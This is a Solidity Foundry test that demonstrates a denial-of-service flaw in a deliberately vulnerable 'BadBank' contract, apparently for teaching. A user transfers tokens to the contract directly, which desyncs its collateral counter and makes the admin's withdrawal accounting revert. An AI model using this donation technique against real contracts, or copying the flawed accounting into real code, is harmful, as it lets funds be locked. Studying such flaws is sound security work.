// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../../src/001-dos-attack/VulnerableLogic.sol";

contract VulnerableLogicTest is Test {
    TokenA tokenA;
    BadBank badBank;
    address admin = address(111);
    address user1 = address(1);
    address user2 = address(2);

    function setUp() public {
        tokenA = new TokenA();
        badBank = new BadBank(address(tokenA), admin);

        tokenA.mint(admin, 10000);
    }

    function testAmount() public {
        vm.startPrank(admin);
        // transfer 3000 tokenA to badBank
        tokenA.transfer(address(badBank), 3000);
        // owner can use the tranferred tokenA to add amount
        badBank.addAmount(3000);
        vm.stopPrank();

        assertEq(badBank.totalCollateral(), 3000);

        vm.startPrank(admin);
        tokenA.transferFrom(address(badBank), admin, 1500);
        badBank.subtractAmount(1500);
        vm.stopPrank();

        assertEq(badBank.totalCollateral(), 1500);
        assertEq(tokenA.balanceOf(address(badBank)), 1500);

        // a user donate some tokenA to badBank to launch a DOS attack
        tokenA.mint(user1, 10);
        vm.prank(user1);
        tokenA.transfer(address(badBank), 10);
        // as this transfer didn't use addAmmount() to update totalCollateral, the following subtractAmount() will fail

        console.log("totalCollateral: ", badBank.totalCollateral());
        console.log("balanceOf BadBank: ", tokenA.balanceOf(address(badBank)));

        vm.startPrank(admin);
        tokenA.transferFrom(address(badBank), admin, 500);
        vm.expectRevert(); // will revert since
        badBank.subtractAmount(500);
        vm.stopPrank();
    }
}
